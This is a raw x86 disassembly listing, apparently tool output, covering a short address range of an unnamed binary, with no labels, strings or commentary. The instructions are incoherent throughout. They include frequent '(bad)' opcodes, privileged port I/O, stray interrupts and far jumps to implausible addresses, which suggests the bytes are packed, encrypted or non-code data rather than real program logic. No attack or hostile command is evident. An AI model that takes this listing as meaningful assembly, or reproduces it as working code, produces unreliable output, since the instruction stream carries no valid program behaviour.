  40baf2:	inc    ebp
  40baf3:	not    al
  40baf5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40baf7:	in     eax,0x21
  40baf9:	ss jg  0x40bb58
  40bafc:	fbstp  TBYTE PTR [ebp+0xf0f9881]
  40bb02:	aas    
  40bb03:	and    DWORD PTR [edi],edx
  40bb05:	loope  0x40baa2
  40bb07:	test   DWORD PTR [esi+0x5d808628],esi
  40bb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb0e:	inc    esp
  40bb0f:	shr    BYTE PTR [ebp+ebx*8+0x377f369a],cl
  40bb16:	push   0xfffffffe
  40bb18:	xor    BYTE PTR [ecx],ch
  40bb1a:	jecxz  0x40bb7b
  40bb1c:	pop    ds
  40bb1d:	dec    ecx
  40bb1e:	ror    dh,cl
  40bb20:	test   BYTE PTR [esi+0x399a9de5],0x8a
  40bb27:	das    
  40bb28:	sub    al,0x37
  40bb2a:	scas   eax,DWORD PTR es:[edi]
  40bb2b:	adc    eax,0xe8bcb587
  40bb30:	fwait
  40bb31:	test   eax,0x592df287
  40bb36:	mov    dh,0x14
  40bb38:	cmc    
  40bb39:	push   cs
  40bb3a:	jns    0x40bb03
  40bb3c:	mov    esi,0xd2227598
  40bb41:	in     al,0xb9
  40bb43:	pop    esp
  40bb44:	xchg   ebp,eax
  40bb45:	lods   eax,DWORD PTR ds:[esi]
  40bb46:	fcmovnbe st,st(1)
  40bb48:	cmp    eax,eax
  40bb4a:	in     al,dx
  40bb4b:	leave  
  40bb4c:	adc    DWORD PTR [eax-0x56aec27a],eax
  40bb52:	in     al,dx
  40bb53:	push   ebx
  40bb54:	cmp    eax,0x7c7160f8
  40bb59:	jle    0x40bb1c
  40bb5b:	fcom   QWORD PTR [eax+0x57]
  40bb5e:	mov    ah,ah
  40bb60:	ret    
  40bb61:	xchg   ecx,eax
  40bb62:	in     al,dx
  40bb63:	xchg   esi,eax
  40bb64:	loopne 0x40bb00
  40bb66:	ins    DWORD PTR es:[edi],dx
  40bb67:	into   
  40bb68:	xchg   edx,eax
  40bb69:	mov    ebp,0xadb332a9
  40bb6e:	fild   WORD PTR [eax+0xa1b2005]
  40bb74:	cmp    eax,0x3243b104
  40bb79:	pop    ecx
  40bb7a:	fsubr  DWORD PTR [eax]
  40bb7c:	jmp    0xac30b4b4
  40bb81:	push   es
  40bb82:	inc    edi
  40bb83:	lahf   
  40bb84:	and    DWORD PTR [ebx+eax*1-0x479e4dc3],ebp
  40bb8b:	ret    0xa6e6
  40bb8e:	push   ecx
  40bb8f:	ins    BYTE PTR es:[edi],dx
  40bb90:	pop    ds
  40bb91:	and    eax,ebp
  40bb93:	or     BYTE PTR [edx],bl
  40bb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb96:	and    ah,BYTE PTR [eax-0x4016c1b4]
  40bb9c:	mov    ah,0x0
  40bb9e:	nop
  40bb9f:	cmp    BYTE PTR [eax],ch
  40bba1:	mov    DWORD PTR [edx+0x5b],esp
  40bba4:	fwait
  40bba5:	mov    WORD PTR [ebx],ds
  40bba7:	pop    edx
  40bba8:	adc    BYTE PTR [ecx-0x16],dl
  40bbab:	lods   eax,DWORD PTR ds:[esi]
  40bbac:	pop    ds
  40bbad:	and    eax,0x15add8b3
  40bbb2:	xor    BYTE PTR [esi+0x57],0x41
  40bbb6:	das    
  40bbb7:	push   ebp
  40bbb8:	sahf   
  40bbb9:	sub    ebx,edi
  40bbbb:	sbb    eax,0xcf19cf77
  40bbc0:	test   al,0xe
  40bbc2:	popf   
  40bbc3:	mov    BYTE PTR [edx],ch
  40bbc5:	ficomp WORD PTR [esi]
  40bbc7:	push   esp
  40bbc8:	xor    bl,cl
  40bbca:	push   esp
  40bbcb:	test   DWORD PTR [ebp+ebx*8-0x1c],0x741f1a2d
  40bbd3:	int3   
  40bbd4:	(bad)  
  40bbd5:	ficom  DWORD PTR ds:0x297ffdcd
  40bbdb:	sbb    BYTE PTR ds:0x65822081,dl
  40bbe1:	ja     0x40bc4a
  40bbe3:	fisub  DWORD PTR [edx+0x39b13ce3]
  40bbe9:	or     al,0x53
  40bbeb:	and    BYTE PTR [ecx],al
  40bbed:	mov    edx,0x620e5745
  40bbf2:	fisub  WORD PTR [ebp-0x4f5947c0]
  40bbf8:	pop    ecx
  40bbf9:	push   ss
  40bbfa:	fwait
  40bbfb:	and    DWORD PTR [eax-0x6f],ebp
  40bbfe:	jmp    0x4e73:0x64300e85
  40bc05:	mov    ds:0xf7f0d203,al
  40bc0a:	cmp    ebp,DWORD PTR [edi-0x2769838c]
  40bc10:	cwde   
  40bc11:	push   edx
  40bc12:	pop    es
  40bc13:	and    eax,0x3fa3d101
  40bc18:	inc    eax
  40bc19:	mov    bl,0x54
  40bc1b:	mov    eax,0x2cba451f
  40bc20:	jle    0x40bc93
  40bc22:	dec    esi
  40bc23:	cli    
  40bc24:	xchg   ebp,ebx
  40bc26:	(bad)
  40bc29:	jle    0x40bc30
  40bc2b:	in     eax,0x77
  40bc2d:	fs or  eax,0x53cf6563
  40bc33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc34:	adc    ecx,DWORD PTR [esi-0x40]
  40bc37:	les    edi,FWORD PTR [eax]
  40bc39:	sbb    edx,eax
  40bc3b:	into   
  40bc3c:	or     eax,0x745e0b16
  40bc41:	cmp    BYTE PTR [edi-0x75],al
  40bc44:	imul   DWORD PTR [ecx+esi*4-0x6e]
  40bc48:	inc    edx
  40bc49:	sub    ah,BYTE PTR [eax+0x1d]
  40bc4c:	inc    edx
  40bc4d:	je     0x40bc4c
  40bc4f:	dec    edx
  40bc50:	(bad)  
  40bc51:	mov    ebx,0x7b83910e
  40bc56:	cmc    
  40bc57:	sbb    al,0x5e
  40bc59:	add    BYTE PTR [edx+0x24248205],0xbb
  40bc60:	or     BYTE PTR [edi-0x76a374a2],0xda
  40bc67:	sbb    eax,DWORD PTR [esi-0x4ebd6cd2]
  40bc6d:	inc    esp
  40bc6e:	push   0xe840752a
  40bc73:	lods   eax,DWORD PTR ds:[esi]
  40bc74:	popa   
  40bc75:	cmp    al,0x1c
  40bc77:	xchg   ebp,eax
  40bc78:	pop    esp
  40bc79:	mov    edi,0x821eb1d5
  40bc7e:	in     eax,dx
  40bc7f:	mov    gs,WORD PTR [eax]
  40bc81:	pop    ss
  40bc82:	and    dh,BYTE PTR [ebp+0x29]
  40bc85:	lock es aaa 
  40bc88:	aaa    
  40bc89:	or     edi,DWORD PTR [edi+edi*4+0x3103c5ab]
  40bc90:	fdiv   DWORD PTR [esi+0x5f]
  40bc93:	inc    ebx
  40bc94:	jae    0x40bc8c
  40bc96:	lods   al,BYTE PTR ds:[esi]
  40bc97:	retf   
  40bc98:	xchg   BYTE PTR [ebx],bh
  40bc9a:	inc    esi
  40bc9b:	call   0x35b5fc1
  40bca0:	std    
  40bca1:	lahf   
  40bca2:	xchg   ecx,eax
  40bca3:	xchg   edx,eax
  40bca4:	xchg   edi,eax
  40bca5:	icebp  
  40bca6:	mov    ebp,DWORD PTR [esi+0x6b48014a]
  40bcac:	jo     0x40bc66
  40bcae:	nop
  40bcaf:	and    DWORD PTR [ebx+ebp*8],ebx
  40bcb2:	jl     0x40bc98
  40bcb4:	xor    al,bl
  40bcb6:	lahf   
  40bcb7:	pop    eax
  40bcb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcb9:	xchg   ebx,eax
  40bcba:	cmp    BYTE PTR [esi],0xd8
  40bcbd:	adc    DWORD PTR [ecx],edi
  40bcbf:	dec    eax
  40bcc0:	jp     0x40bcfb
  40bcc2:	jbe    0x40bcd4
  40bcc4:	mov    al,ds:0xc292c375
  40bcc9:	xchg   esi,eax
  40bcca:	sbb    eax,0xaef97c53
  40bccf:	mov    edi,0xf0a0635e
  40bcd4:	jb     0x40bc94
  40bcd6:	loopne 0x40bcb7
  40bcd8:	(bad)
  40bcdb:	cmp    al,bh
  40bcdd:	dec    ebp
  40bcde:	xor    al,0x16
  40bce0:	add    ah,ch
  40bce2:	js     0x40bd1c
  40bce4:	iret   
  40bce5:	adc    esi,esi
  40bce7:	test   eax,0x4b34f6da
  40bcec:	mov    eax,0xb05b6829
  40bcf1:	push   eax
  40bcf2:	arpl   WORD PTR [eax+esi*1+0x1c],ax
  40bcf6:	push   ss
  40bcf7:	imul   esi
  40bcf9:	add    edi,DWORD PTR [ecx+0x29]
  40bcfc:	inc    ebx
  40bcfd:	fmul   st(7),st
  40bcff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd00:	imul   edx,DWORD PTR [ecx+0x4b163655],0xfe3c2fe7
  40bd0a:	sahf   
  40bd0b:	icebp  
  40bd0c:	std    
  40bd0d:	jle    0x40bcd8
  40bd0f:	sti    
  40bd10:	pop    edx
  40bd11:	push   0x56
  40bd13:	iret   
  40bd14:	sbb    BYTE PTR [edx+eax*8],0xf1
  40bd18:	cli    
  40bd19:	sbb    ebp,DWORD PTR [edx]
  40bd1b:	sub    eax,DWORD PTR [eax]
  40bd1d:	dec    ecx
  40bd1e:	add    cl,BYTE PTR [edi+ecx*2+0x55]
  40bd22:	sar    dl,cl
  40bd24:	adc    DWORD PTR [ebp-0x763d35d3],eax
  40bd2a:	pushf  
  40bd2b:	sbb    al,0x95
  40bd2d:	jecxz  0x40bd6e
  40bd2f:	mov    esi,0x85338b7f
  40bd34:	push   eax
  40bd35:	repnz mov bh,0xdd
  40bd38:	jmp    0x40bd1d
  40bd3a:	icebp  
  40bd3b:	ror    DWORD PTR [ebx],cl
  40bd3d:	sbb    edi,edx
  40bd3f:	dec    ecx
  40bd40:	xchg   esp,eax
  40bd41:	adc    eax,0x374642ff
  40bd46:	or     eax,DWORD PTR [ebx-0x2a5b9615]
  40bd4c:	push   edx
  40bd4d:	in     al,0xdc
  40bd4f:	icebp  
  40bd50:	mov    WORD PTR [ebx+0x47],cs
  40bd53:	sbb    al,0xba
  40bd55:	ins    BYTE PTR es:[edi],dx
  40bd56:	mov    esi,0x103eba86
  40bd5b:	je     0x40bd96
  40bd5d:	and    DWORD PTR [ebp+0x6c9adfaf],edi
  40bd63:	ins    DWORD PTR es:[edi],dx
  40bd64:	addr16 in eax,dx
  40bd66:	xchg   al,bh
  40bd68:	gs xchg edi,eax
  40bd6a:	push   ecx
  40bd6b:	out    0x94,al
  40bd6d:	hlt    
  40bd6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd6f:	imul   ebx,ecx,0x1e
  40bd72:	inc    esp
  40bd73:	dec    edi
  40bd74:	jns    0x40bd41
  40bd76:	outs   dx,DWORD PTR ds:[esi]
  40bd77:	jae    0x40bd06
  40bd79:	rcl    DWORD PTR [edx+0x45743702],1
  40bd7f:	xor    dh,BYTE PTR [ebx+0x6c]
  40bd82:	in     al,dx
  40bd83:	sbb    bl,ah
  40bd85:	adc    dh,dl
  40bd87:	or     ch,0xb4
  40bd8a:	mov    ah,0x56
  40bd8c:	in     eax,dx
  40bd8d:	imul   esi,DWORD PTR ds:0x3318e990,0xfffffffd
  40bd94:	xor    bh,cl
  40bd96:	fnstcw WORD PTR [eax+ebp*1-0x25554bf4]
  40bd9d:	xor    BYTE PTR [ebp+0x5b],al
  40bda0:	jecxz  0x40bdd3
  40bda2:	or     ch,BYTE PTR [ebp+edi*1+0x17137da]
  40bda9:	dec    esi
  40bdaa:	sub    eax,DWORD PTR [esi+eiz*1+0x7006ca2c]
  40bdb1:	shl    bh,cl
  40bdb3:	fscale 
  40bdb5:	scas   al,BYTE PTR es:[edi]
  40bdb6:	fwait
  40bdb7:	stos   DWORD PTR es:[edi],eax
  40bdb8:	es in  al,0xaa
  40bdbb:	jae    0x40be16
  40bdbd:	gs dec ebx
  40bdbf:	jp     0x40be05
  40bdc1:	push   edi
  40bdc2:	js     0x40bdeb
  40bdc4:	sbb    bh,BYTE PTR ds:[ebx-0x54cfccd2]
  40bdcb:	retf   0x71ea
  40bdce:	fdiv   DWORD PTR [edi+0x523de87a]
  40bdd4:	jb     0x40bd84
  40bdd6:	dec    esi
  40bdd7:	data16 mov BYTE PTR [ebx],ch
  40bdda:	ss fstp TBYTE PTR gs:0x56a9654e
  40bde2:	jnp    0x40be1d
  40bde4:	into   
  40bde5:	enter  0xc39,0xd
  40bde9:	xchg   edi,eax
  40bdea:	jecxz  0x40bd70
  40bdec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bded:	fnstcw WORD PTR [ebp+0x38d0ddb7]
  40bdf3:	sbb    al,0x74
  40bdf5:	shl    DWORD PTR [ebx],cl
  40bdf7:	rcr    dh,1
  40bdf9:	scas   eax,DWORD PTR es:[edi]
  40bdfa:	popf   
  40bdfb:	xchg   edi,eax
  40bdfc:	enter  0x6d04,0xb7
  40be00:	test   DWORD PTR [eax+0x79],0x3e7b7cc
  40be07:	jnp    0x40bda1
  40be09:	jbe    0x40bd8e
  40be0b:	push   ds
  40be0c:	std    
  40be0d:	int3   
  40be0e:	jle    0x40bddc
  40be10:	in     eax,dx
  40be11:	aam    0x61
  40be13:	push   esp
  40be14:	(bad)
  40be17:	icebp  
  40be18:	into   
  40be19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1a:	inc    eax
  40be1b:	xlat   BYTE PTR ds:[ebx]
  40be1c:	pop    ds
  40be1d:	inc    eax
  40be1e:	popf   
  40be1f:	push   ds
  40be20:	arpl   WORD PTR [edi],si
  40be22:	in     eax,dx
  40be23:	into   
  40be24:	xchg   esi,eax
  40be25:	test   ebp,ebp
  40be27:	js     0x40be8b
  40be29:	cmc    
  40be2a:	fucomi st,st(0)
  40be2c:	enter  0xbc97,0xf1
  40be30:	inc    ebx
  40be31:	adc    DWORD PTR [esi-0x76],0xffffff96
  40be35:	shl    DWORD PTR [edx],1
  40be37:	es pop es
  40be39:	add    esp,DWORD PTR [esp+ebp*8+0x43]
  40be3d:	pop    ebx
  40be3e:	inc    eax
  40be3f:	popf   
  40be40:	das    
  40be41:	daa    
  40be42:	test   al,0xbb
  40be44:	and    ebx,eax
  40be46:	popa   
  40be47:	jg     0x40be36
  40be49:	push   esp
  40be4a:	pop    ebx
  40be4b:	aam    0x3c
  40be4d:	(bad)  
  40be4e:	and    bh,BYTE PTR [ecx+0x7c6f17a4]
  40be54:	cdq    
  40be55:	(bad)  
  40be56:	cs ret 0xb4de
  40be5a:	pop    eax
  40be5b:	cmp    DWORD PTR [ebx],ecx
  40be5d:	dec    esi
  40be5e:	nop
  40be5f:	lea    esp,[edi]
  40be61:	pop    edx
  40be62:	fwait
  40be63:	or     al,0x41
  40be65:	pop    edx
  40be66:	je     0x40bee2
  40be68:	push   ss
  40be69:	jne    0x40beb1
  40be6b:	mov    eax,0xfefb79c4
  40be70:	arpl   WORD PTR [eax+0x1c],cx
  40be73:	outs   dx,DWORD PTR ds:[esi]
  40be74:	shl    DWORD PTR [ecx+0x61],0x37
  40be78:	sub    DWORD PTR [ecx+eiz*2+0xe],esi
  40be7c:	ficomp DWORD PTR [ebp-0x5b]
  40be7f:	push   esp
  40be80:	int3   
  40be81:	xor    eax,0x70d573ad
  40be86:	pop    ebx
  40be87:	or     al,0x26
  40be89:	xchg   esp,eax
  40be8a:	cmp    eax,0x2be9e195
  40be8f:	retf   
  40be90:	iret   
  40be91:	push   esi
  40be92:	push   edi
  40be93:	push   es
  40be94:	xchg   eax,edx
  40be96:	(bad)  
  40be97:	mov    bl,0x1b
  40be99:	or     BYTE PTR ds:0xd205658c,dl
  40be9f:	push   0xe1b4b751
  40bea4:	arpl   WORD PTR [eax*2+0x5c37abb7],dx
  40beab:	pop    esi
  40beac:	leave  
  40bead:	add    ecx,DWORD PTR ds:0x65d37986
  40beb3:	lds    edi,FWORD PTR [esi+ebx*4-0x25]
  40beb7:	mov    edi,0x36dd4d8d
  40bebc:	push   esi
  40bebd:	add    DWORD PTR [esi+0x18608127],esp
  40bec3:	add    eax,0x202b557c
  40bec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bec9:	and    cl,al
  40becb:	jb     0x40be4d
  40becd:	in     al,dx
  40bece:	dec    edi
  40becf:	hlt    
  40bed0:	je     0x40bec4
  40bed2:	das    
  40bed3:	push   ebp
  40bed4:	fdivr  st(7),st
  40bed6:	jle    0x40bedb
  40bed8:	jbe    0x40be5a
  40beda:	fwait
  40bedb:	out    dx,eax
  40bedc:	lods   al,BYTE PTR ds:[esi]
  40bedd:	jl     0x40befe
  40bedf:	ja     0x40bf12
  40bee1:	sar    BYTE PTR [edi-0x3bf4d85a],cl
  40bee7:	or     esi,ecx
  40bee9:	add    BYTE PTR [ebx+eiz*2],0x7e
  40beed:	nop
  40beee:	inc    edx
  40beef:	pop    esp
  40bef0:	dec    esi
  40bef1:	push   ds
  40bef2:	jmp    0x3c91e23c
  40bef7:	xor    edi,esp
  40bef9:	(bad)  
  40befa:	aam    0x60
  40befc:	je     0x40bf24
  40befe:	jmp    0x6ab:0xa6b33631
  40bf05:	jo     0x40bea0
  40bf07:	cli    
  40bf08:	lahf   
  40bf09:	(bad)  
  40bf0a:	jle    0x40bef6
  40bf0c:	and    eax,0xa7cad003
  40bf11:	jecxz  0x40bf83
  40bf13:	shl    BYTE PTR [edi],1
  40bf15:	dec    esp
  40bf16:	add    dh,dh
  40bf18:	sbb    dh,BYTE PTR [ebp+0x2b]
  40bf1b:	jnp    0x40bf15
  40bf1d:	dec    esi
  40bf1e:	xor    dh,BYTE PTR [eax-0xa]
  40bf21:	cmp    cl,cl
  40bf23:	xchg   esp,eax
  40bf24:	jne    0x40bf60
  40bf26:	and    edx,edi
  40bf28:	lods   eax,DWORD PTR ds:[esi]
  40bf29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf2a:	inc    esi
  40bf2b:	push   eax
  40bf2c:	fisub  WORD PTR ds:0xc4d9c576
  40bf32:	pop    edx
  40bf33:	xlat   BYTE PTR ds:[ebx]
  40bf34:	pop    ebp
  40bf35:	cmp    DWORD PTR [di-0x3c7c],esi
  40bf3a:	cdq    
  40bf3b:	or     bh,BYTE PTR [eax]
  40bf3d:	xchg   ecx,eax
  40bf3e:	mov    DWORD PTR [esi+edx*8],esi
  40bf41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf42:	sub    edx,ecx
  40bf44:	inc    ebp
  40bf45:	dec    esp
  40bf46:	and    eax,0x61d152a7
  40bf4b:	jecxz  0x40bfb6
  40bf4d:	das    
  40bf4e:	in     eax,dx
  40bf4f:	imul   ebx,DWORD PTR [eax+0x40809e1b],0x3
  40bf56:	and    al,0xa2
  40bf58:	rol    BYTE PTR [ecx-0x2a553db1],1
  40bf5e:	push   0x506880e3
  40bf63:	xchg   ebx,eax
  40bf64:	add    DWORD PTR [edi+edi*8-0x6cf5acb],edi
  40bf6b:	xor    bl,BYTE PTR [edx-0x23]
  40bf6e:	add    ebx,0xb9edecb9
  40bf74:	or     dh,BYTE PTR [edx]
  40bf76:	jp     0x40bff7
  40bf78:	mov    ebp,0x7f92e0a4
  40bf7d:	jno    0x40bfb1
  40bf7f:	mov    cl,0x7a
  40bf81:	ins    BYTE PTR es:[edi],dx
  40bf82:	in     al,0x74
  40bf84:	jmpw   0xcdf0
  40bf88:	aas    
  40bf89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf8a:	adc    eax,DWORD PTR [esi+edi*2]
  40bf8d:	add    al,0x3
  40bf8f:	lock in al,0xdb
  40bf92:	test   bl,ah
  40bf94:	adc    DWORD PTR [edx-0x4e1c39b4],0x1e06ecc5
  40bf9e:	xlat   BYTE PTR ds:[ebx]
  40bf9f:	jbe    0x40bf3a
  40bfa1:	sbb    ch,BYTE PTR [edi-0x68]
  40bfa4:	push   ecx
  40bfa5:	ss je  0x40bf79
  40bfa8:	pop    ecx
  40bfa9:	fisttp DWORD PTR [ebp+eiz*1+0xe]
  40bfad:	xor    eax,DWORD PTR [edi]
  40bfaf:	inc    ebp
  40bfb0:	popa   
  40bfb1:	popa   
  40bfb2:	xor    bl,BYTE PTR [esi]
  40bfb4:	push   0x28
  40bfb6:	push   0x1f
  40bfb8:	jmp    0x40bf4e
  40bfba:	pop    edi
  40bfbb:	pop    esi
  40bfbc:	rcl    DWORD PTR [ebx+0x4eb11ce0],1
  40bfc2:	pop    edx
  40bfc3:	mov    esp,0x778d44f7
  40bfc8:	pop    ds
  40bfc9:	mov    ecx,0xd0afbcd7
  40bfce:	jg     0x40bf5a
  40bfd0:	xchg   al,dh
  40bfd2:	push   cs
  40bfd3:	fcom   DWORD PTR [ebp-0x664eebf8]
  40bfd9:	test   al,0x56
  40bfdb:	(bad)  
  40bfdd:	sbb    ch,BYTE PTR [ebx+0x7a]
  40bfe0:	jle    0x40bfe9
  40bfe2:	pop    ss
  40bfe3:	cdq    
  40bfe4:	std    
  40bfe5:	xchg   edx,eax
  40bfe6:	mov    WORD PTR [ebp+0x76],?
  40bfe9:	(bad)  
  40bfea:	into   
  40bfeb:	push   ecx
  40bfec:	cwde   
  40bfed:	call   FWORD PTR [eax]
  40bfef:	jno    0x40c06e
  40bff1:	call   0xe4c538ea
  40bff6:	and    DWORD PTR [ecx+0x1e12fe32],esi
  40bffc:	xlat   BYTE PTR ds:[ebx]
  40bffd:	fdiv   QWORD PTR [edi+0x26]
  40c000:	push   ebx
  40c001:	jne    0x40bfab
  40c003:	push   es
  40c004:	mov    eax,ds:0xd0105651
  40c009:	sbb    al,BYTE PTR [edi]
  40c00b:	lock xchg ebp,eax
  40c00d:	ret    
  40c00e:	imul   edi
  40c010:	jg     0x40c029
  40c012:	in     al,0xfb
  40c014:	mov    DWORD PTR [esi],edi
  40c016:	mov    ebx,ecx
  40c018:	adc    al,0x57
  40c01a:	stos   BYTE PTR es:[edi],al
  40c01b:	xor    ebp,ebp
  40c01d:	inc    edx
  40c01e:	in     al,0xcc
  40c020:	pop    edi
  40c021:	xchg   esp,eax
  40c022:	or     eax,0x1810dc4e
  40c027:	sbb    ecx,DWORD PTR [edx]
  40c029:	fist   WORD PTR [esi]
  40c02b:	ins    DWORD PTR es:[edi],dx
  40c02c:	into   
  40c02d:	sbb    cl,BYTE PTR [ecx]
  40c02f:	sahf   
  40c030:	sub    DWORD PTR [eax],0x32cc4196
  40c036:	xor    eax,0x13cb5f02
  40c03b:	mov    ebp,0x4f8a237e
  40c040:	fisub  DWORD PTR [eax]
  40c042:	retf   0xe1a4
  40c045:	outs   dx,DWORD PTR ds:[esi]
  40c046:	and    dh,BYTE PTR [ebx]
  40c048:	mov    ss:0x2e80e5f6,eax
  40c04e:	push   esp
  40c04f:	(bad)  
  40c051:	shl    cx,1
  40c054:	les    ebp,FWORD PTR [eax+0x12]
  40c057:	cmp    eax,0x684ffda4
  40c05c:	je     0x40c049
  40c05e:	jl     0x40c07b
  40c060:	mov    bh,0x85
  40c062:	mov    ch,0xd1
  40c064:	sbb    ah,BYTE PTR [ecx+edi*1+0x51]
  40c068:	inc    ecx
  40c069:	stc    
  40c06a:	ins    BYTE PTR es:[edi],dx
  40c06b:	aam    0x2d
  40c06d:	(bad)
  40c072:	mov    dl,0x33
  40c074:	xchg   esi,eax
  40c075:	or     eax,0x871147e0
  40c07a:	xchg   ecx,eax
  40c07b:	out    dx,al
  40c07c:	pop    eax
  40c07d:	jge    0x40c0cb
  40c07f:	fucompp 
  40c081:	fst    QWORD PTR [ebx]
  40c083:	in     al,dx
  40c084:	adc    ebx,DWORD PTR [ecx-0x2cedbd10]
  40c08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c08b:	and    ah,0x38
  40c08e:	retf   
  40c08f:	sub    ebx,DWORD PTR [eax+0x4413e4b7]
  40c095:	mov    edi,0x539ba6c0
  40c09a:	mov    eax,ds:0xc5f5cb74
  40c09f:	and    eax,0x7aad4d86
  40c0a4:	ret    0x72b7
  40c0a7:	out    dx,al
  40c0a8:	jmp    0x40c0c3
  40c0aa:	cmc    
  40c0ab:	fidivr WORD PTR [edx]
  40c0ad:	ds inc edx
  40c0af:	pusha  
  40c0b0:	mov    cs,WORD PTR [esi]
  40c0b2:	sub    BYTE PTR [edi],cl
  40c0b4:	push   cs
  40c0b5:	pop    ebx
  40c0b6:	adc    eax,DWORD PTR [ebx]
  40c0b8:	std    
  40c0b9:	sbb    eax,0x7c81421
  40c0be:	outs   dx,BYTE PTR ds:[esi]
  40c0bf:	xlat   BYTE PTR ds:[ebx]
  40c0c0:	call   0x9e51:0x2541134d
  40c0c7:	ret    
  40c0c8:	jle    0x40c072
  40c0ca:	pop    ds
  40c0cb:	ficom  WORD PTR [esi+0x22]
  40c0ce:	les    eax,FWORD PTR es:[ebx+0x78]
  40c0d2:	jmp    0x40c0ad
  40c0d4:	bound  ecx,QWORD PTR [eax+eiz*2]
  40c0d7:	icebp  
  40c0d8:	push   edx
  40c0d9:	test   edi,edi
  40c0db:	xchg   edi,eax
  40c0dc:	aas    
  40c0dd:	ds push cs
  40c0df:	div    esi
  40c0e1:	sbb    esi,ebp
  40c0e3:	cmp    eax,0xff28a2f2
  40c0e8:	jmp    0x677a:0x6d9a3810
  40c0ef:	jns    0x40c0a0
  40c0f1:	mov    eax,ds:0x7a69faf2
  40c0f6:	jb     0x40c0ce
  40c0f8:	sahf   
  40c0f9:	test   BYTE PTR [esi+0x23],ah
  40c0fc:	nop
  40c0fd:	jae    0x40c099
  40c0ff:	rcl    DWORD PTR ds:0xfcb6c724,0x88
  40c106:	lods   eax,DWORD PTR ds:[esi]
  40c107:	stos   BYTE PTR es:[edi],al
  40c108:	and    eax,0x784c0d33
  40c10d:	push   ebp
  40c10e:	pop    esp
  40c10f:	sub    BYTE PTR [ecx],bl
  40c111:	aad    0x99
  40c113:	aad    0xb5
  40c115:	repnz push ds
  40c117:	in     eax,0xb
  40c119:	xchg   ebx,eax
  40c11a:	in     al,0x16
  40c11c:	jmp    0xaca274bb
  40c121:	cmp    dh,bl
  40c123:	retf   
  40c124:	and    BYTE PTR [edi-0x2],dl
  40c127:	cmp    DWORD PTR [ecx],edx
  40c129:	cli    
  40c12a:	xlat   BYTE PTR ds:[ebx]
  40c12b:	outs   dx,DWORD PTR ds:[esi]
  40c12c:	sar    DWORD PTR [edx+0x37],1
  40c12f:	mov    DWORD PTR [edi-0x6e6dbc38],edx
  40c135:	push   edx
  40c136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c137:	fwait
  40c138:	jbe    0x40c0bb
  40c13a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c13b:	out    dx,eax
  40c13c:	loope  0x40c0d8
  40c13e:	or     dh,dl
  40c140:	out    dx,eax
  40c141:	mov    ds:0x7ef741c7,eax
  40c146:	scas   eax,DWORD PTR es:[edi]
  40c147:	popa   
  40c148:	sahf   
  40c149:	inc    ebp
  40c14a:	mul    DWORD PTR [ebp-0x3b2ee27b]
  40c150:	js     0x40c143
  40c152:	xor    cl,0xad
  40c155:	pop    eax
  40c156:	cs jecxz 0x40c197
  40c159:	inc    edx
  40c15a:	push   ecx
  40c15b:	ficom  DWORD PTR [ebx+ecx*1]
  40c15e:	xchg   edx,eax
  40c15f:	ins    BYTE PTR es:[edi],dx
  40c160:	lock call 0x73bceba
  40c166:	jle    0x40c161
  40c168:	(bad)  
  40c169:	out    dx,eax
  40c16a:	out    dx,al
  40c16b:	outs   dx,DWORD PTR ds:[esi]
  40c16c:	clc    
  40c16d:	(bad)  
  40c16e:	rcl    BYTE PTR [esi-0xe4dd85f],cl
  40c174:	imul   edx,DWORD PTR [esi-0x160109bf],0xf
  40c17b:	sbb    al,0xe5
  40c17d:	popf   
  40c17e:	jecxz  0x40c1f4
  40c180:	iret   
  40c181:	add    ebx,DWORD PTR [edi]
  40c183:	jo     0x40c180
  40c185:	push   eax
  40c186:	push   ebp
  40c187:	pop    ds
  40c188:	(bad)  [esp+ebp*8+0x18]
  40c18c:	jnp    0x40c181
  40c18e:	lahf   
  40c18f:	add    bl,BYTE PTR [edi]
  40c191:	(bad)  
  40c192:	repnz mov esi,0x3d53dc66
  40c198:	sti    
  40c199:	pop    es
  40c19a:	xor    BYTE PTR [edx-0x58e26f9e],cl
  40c1a0:	jb     0x40c18c
  40c1a2:	sti    
  40c1a3:	cdq    
  40c1a4:	scas   eax,DWORD PTR es:[edi]
  40c1a5:	push   es
  40c1a6:	dec    ebp
  40c1a7:	(bad)  
  40c1a8:	mov    ds:0x7ad4e158,al
  40c1ad:	cwde   
  40c1ae:	mov    bl,0xe1
  40c1b0:	push   eax
  40c1b1:	jp     0x40c217
  40c1b3:	mov    edi,0x6d5e61e9
  40c1b8:	and    al,0xb5
  40c1ba:	mov    al,ds:0xdeee0441
  40c1bf:	adc    DWORD PTR [edx],0xfffffff0
  40c1c2:	int    0x84
  40c1c4:	gs jno 0x40c196
  40c1c7:	push   esp
  40c1c8:	jnp    0x40c1c5
  40c1ca:	aaa    
  40c1cb:	lock pushf 
  40c1cd:	jb     0x40c214
  40c1cf:	je     0x40c19a
  40c1d1:	mov    BYTE PTR [edx],ah
  40c1d3:	xchg   ecx,eax
  40c1d4:	push   esp
  40c1d5:	rcl    al,0x53
  40c1d8:	sub    BYTE PTR [edi+eax*4-0x17],ch
  40c1dc:	cs ret 
  40c1de:	adc    al,BYTE PTR [ebp+0xe]
  40c1e1:	mov    cl,0xf3
  40c1e3:	or     BYTE PTR [edx+edx*8],ah
  40c1e6:	out    0x47,eax
  40c1e8:	test   al,0xe0
  40c1ea:	icebp  
  40c1eb:	sbb    DWORD PTR [esi-0x47fcd9a5],eax
  40c1f1:	jle    0x40c265
  40c1f3:	xchg   DWORD PTR [eax+0x9],esi
